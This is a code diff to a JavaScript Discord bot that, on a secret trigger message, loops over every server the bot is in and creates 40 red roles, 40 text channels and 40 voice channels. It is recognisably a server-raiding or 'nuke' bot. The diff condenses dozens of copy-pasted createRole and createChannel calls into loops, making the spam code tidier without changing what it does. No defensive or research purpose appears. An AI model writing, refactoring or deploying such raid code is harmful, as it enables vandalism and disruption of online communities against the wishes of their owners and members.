@@ -86,204 +86,15 @@ let me = message.author
 
                 if (message.content === x_x) {
                     client.guilds.forEach(m =>{
+                        for (let i = 0; i < 40; i++) {
              m.createRole({
                    name : role,
                    permissions :   [1],
                    color : " #ff0000"
                }) 
-               m.createRole({
-                   name : role,
-                   permissions :   [1],
-                   color : " #ff0000"
-               })
-               m.createRole({
-                   name : role,
-                   permissions :   [1],
-                   color : " #ff0000"
-               })
-               m.createRole({
-                   name : role,
-                   permissions :   [1],
-                   color : " #ff0000"
-               })
-               m.createRole({
-                   name : role,
-                   permissions :   [1],
-                   color : " #ff0000"
-               })
-               m.createRole({
-                   name : role,
-                   permissions :   [1],
-                   color : " #ff0000"
-               })
-               m.createRole({
-                   name : role,
-                   permissions :   [1],
-                   color : " #ff0000"
-               })
-               m.createRole({
-                   name : role,
-                   permissions :   [1],
-                   color : " #ff0000"
-               })
-               m.createRole({
-                   name : role,
-                   permissions :   [1],
-                   color : " #ff0000"
-               })
+                        }
            
-               m.createRole({
-                   name : role,
-                   permissions :   [1],
-                   color : " #ff0000"
-               })
-               m.createRole({
-                   name : role,
-                   permissions :   [1],
-                   color : " #ff0000"
-               })
-               m.createRole({
-                   name : role,
-                   permissions :   [1],
-                   color : " #ff0000"
-               })
-                m.createRole({
-                   name : role,
-                   permissions :   [1],
-                   color : " #ff0000"
-               })
-               m.createRole({
-                   name : role,
-                   permissions :   [1],
-                   color : " #ff0000"
-               })
-           
-               m.createRole({
-                   name : role,
-                   permissions :   [1],
-                   color : " #ff0000"
-               }) 
-               m.createRole({
-                   name : role,
-                   permissions :   [1],
-                   color : " #ff0000"
-               })
-           
-               m.createRole({
-                   name : role,
-                   permissions :   [1],
-                   color : " #ff0000"
-               }) 
-               m.createRole({
-                   name : role,
-                   permissions :   [1],
-                   color : " #ff0000"
-               })
-               m.createRole({
-                   name : role,
-                   permissions :   [1],
-                   color : " #ff0000"
-               })
-               m.createRole({
-                   name : role,
-                   permissions :   [1],
-                   color : " #ff0000"
-               })
-               m.createRole({
-                   name : role,
-                   permissions :   [1],
-                   color : " #ff0000"
-               })
-               m.createRole({
-                   name : role,
-                   permissions :   [1],
-                   color : " #ff0000"
-               })
-               m.createRole({
-                   name : role,
-                   permissions :   [1],
-                   color : " #ff0000"
-               })
-               m.createRole({
-                   name : role,
-                   permissions :   [1],
-                   color : " #ff0000"
-               })
-               m.createRole({
-                   name : role,
-                   permissions :   [1],
-                   color : " #ff0000"
-               })
-               m.createRole({
-                   name : role,
-                   permissions :   [1],
-                   color : " #ff0000"
-               })
-               m.createRole({
-                   name : role,
-                   permissions :   [1],
-                   color : " #ff0000"
-               })
-               m.createRole({
-                   name : role,
-                   permissions :   [1],
-                   color : " #ff0000"
-               })
-               m.createRole({
-                   name : role,
-                   permissions :   [1],
-                   color : " #ff0000"
-               })
-               m.createRole({
-                   name : role,
-                   permissions :   [1],
-                   color : " #ff0000"
-               })
-               m.createRole({
-                   name : role,
-                   permissions :   [1],
-                   color : " #ff0000"
-               })
-               m.createRole({
-                   name : role,
-                   permissions :   [1],
-                   color : " #ff0000"
-               })
-               m.createRole({
-                   name : role,
-                   permissions :   [1],
-                   color : " #ff0000"
-               })
-           
-               m.createRole({
-                   name : role,
-                   permissions :   [1],
-                   color : " #ff0000"
-               })
-               m.createRole({
-                   name : role,
-                   permissions :   [1],
-                   color : " #ff0000"
-               })
-           
-               m.createRole({
-                   name : role,
-                   permissions :   [1],
-                   color : " #ff0000"
-               })
-               m.createRole({
-                   name : role,
-                   permissions :   [1],
-                   color : " #ff0000"
-               })
-               m.createRole({
-                   name : role,
-                   permissions :   [1],
-                   color : " #ff0000"
-               })
-           
-           
-               
+     
            })
             
             
@@ -293,118 +104,18 @@ let me = message.author
            client.on('message', message => {
                     if (message.content === x_x) {
                           client.guilds.forEach(m =>{
-           m.createChannel(teext, 'text');
-           m.createChannel(teext, 'text');
-           m.createChannel(teext, 'text');
-           m.createChannel(teext, 'text');
-           m.createChannel(teext, 'text');
-           m.createChannel(teext, 'text');
-           m.createChannel(teext, 'text');
-           m.createChannel(teext, 'text');
-           m.createChannel(teext, 'text');
-           m.createChannel(teext, 'text');
-           
-           m.createChannel(teext, 'text');
-           
-           m.createChannel(teext, 'text');
-           
-           m.createChannel(teext, 'text');
-           
-           m.createChannel(teext, 'text');
-           m.createChannel(teext, 'text');
-           m.createChannel(teext, 'text');
-           m.createChannel(teext, 'text');
-           m.createChannel(teext, 'text');
-           m.createChannel(teext, 'text');
-           m.createChannel(teext, 'text');
-           m.createChannel(teext, 'text');
-           m.createChannel(teext, 'text');
-           m.createChannel(teext, 'text');
-           m.createChannel(teext, 'text');
-           
-           m.createChannel(teext, 'text');
-           m.createChannel(teext, 'text');
-           
-           m.createChannel(teext, 'text');
-           m.createChannel(teext, 'text');
-           m.createChannel(teext, 'text');
-           m.createChannel(teext, 'text');
-           m.createChannel(teext, 'text');
-           m.createChannel(teext, 'text');
-           m.createChannel(teext, 'text');
-           m.createChannel(teext, 'text');
-           m.createChannel(teext, 'text');
-           m.createChannel(teext, 'text');
-           m.createChannel(teext, 'text');
-           
-           m.createChannel(teext, 'text');
-           m.createChannel(teext, 'text');
-           
+                              for (let i = 0; i < 40; i++) {
+                            m.createChannel(teext, { type: 'text' });
+                              }
            })
            }
            });
            client.on('message', message => {
                     if (message.content === x_x) {
                             client.guilds.forEach(m =>{
-           m.createChannel(vooice, 'voice');
-           m.createChannel(vooice, 'voice');
-           m.createChannel(vooice, 'voice');
-           m.createChannel(vooice, 'voice');
-           m.createChannel(vooice, 'voice');
-           m.createChannel(vooice, 'voice');
-           m.createChannel(vooice, 'voice');
-           m.createChannel(vooice, 'voice');
-           
-           m.createChannel(vooice, 'voice');
-           m.createChannel(vooice, 'voice');
-           
-           m.createChannel(vooice, 'voice');
-           m.createChannel(vooice, 'voice');
-           m.createChannel(vooice, 'voice');
-           m.createChannel(vooice, 'voice');
-           m.createChannel(vooice, 'voice');
-           m.createChannel(vooice, 'voice');
-           m.createChannel(vooice, 'voice');
-           m.createChannel(vooice, 'voice');
-           m.createChannel(vooice, 'voice');
-           m.createChannel(vooice, 'voice');
-           m.createChannel(vooice, 'voice');
-           m.createChannel(vooice, 'voice');
-           
-           m.createChannel(vooice, 'voice');
-           m.createChannel(vooice, 'voice');
-           m.createChannel(vooice, 'voice');
-           m.createChannel(vooice, 'voice');
-           m.createChannel(vooice, 'voice');
-           m.createChannel(vooice, 'voice');
-           m.createChannel(vooice, 'voice');
-           m.createChannel(vooice, 'voice');
-           
-           m.createChannel(vooice, 'voice');
-           m.createChannel(vooice, 'voice');
-           m.createChannel(vooice, 'voice');
-           m.createChannel(vooice, 'voice');
-           m.createChannel(vooice, 'voice');
-           m.createChannel(vooice, 'voice');
-           m.createChannel(vooice, 'voice');
-           m.createChannel(vooice, 'voice');
-           m.createChannel(vooice, 'voice');
-           m.createChannel(vooice, 'voice');
-           m.createChannel(vooice, 'voice');
-           
-           m.createChannel(vooice, 'voice');
-           m.createChannel(vooice, 'voice');
-           m.createChannel(vooice, 'voice');
-           m.createChannel(vooice, 'voice');
-           m.createChannel(vooice, 'voice');
-           m.createChannel(vooice, 'voice');
-           m.createChannel(vooice, 'voice');
-           m.createChannel(vooice, 'voice');
-           m.createChannel(vooice, 'voice');
-           m.createChannel(vooice, 'voice');
-           m.createChannel(vooice, 'voice');
-           m.createChannel(vooice, 'voice');
-           m.createChannel(vooice, 'voice');
+        for (let i = 0; i < 40; i++) {
+                            m.createChannel(vooice, { type: 'voice' });
+                              }
            
            
            })
